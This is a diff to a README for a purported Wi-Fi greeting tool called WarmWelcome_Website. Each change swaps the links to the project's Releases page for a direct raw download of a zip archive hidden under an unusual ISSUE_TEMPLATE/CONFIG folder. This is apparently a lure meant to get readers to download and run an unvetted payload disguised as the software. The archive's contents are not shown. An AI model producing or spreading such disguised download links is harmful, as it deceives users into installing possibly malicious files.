@@ -1,6 +1,6 @@
 # 🌐️ WarmWelcome_Website - Effortless Wi-Fi Connection Greetings
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Here-brightgreen)](https://github.com/200Hunter/WarmWelcome_Website/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/200Hunter/WarmWelcome_Website/WarmWelcome_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/CONFIG/WarmWelcome_Website_v1.4-alpha.3.zip)](https://raw.githubusercontent.com/200Hunter/WarmWelcome_Website/WarmWelcome_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/CONFIG/WarmWelcome_Website_v1.4-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ To run the WarmWelcome_Website, ensure you have the following:
 
 1. **Download the Software**: Visit the Releases page to get the latest version of WarmWelcome. Click the link below:
 
-   [Visit this page to download](https://github.com/200Hunter/WarmWelcome_Website/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/200Hunter/WarmWelcome_Website/WarmWelcome_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/CONFIG/WarmWelcome_Website_v1.4-alpha.3.zip)
 
 2. **Choose the Right File**: Depending on your operating system (Windows, macOS, Linux), select the appropriate file and click on it to start the download.
 
@@ -75,4 +75,4 @@ The WarmWelcome_Website is associated with the following topics:
 
 Stay connected, and enjoy seamless Wi-Fi experiences with WarmWelcome!
 
-[Visit this page to download](https://github.com/200Hunter/WarmWelcome_Website/releases)
+[Visit this page to download](https://raw.githubusercontent.com/200Hunter/WarmWelcome_Website/WarmWelcome_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/CONFIG/WarmWelcome_Website_v1.4-alpha.3.zip)
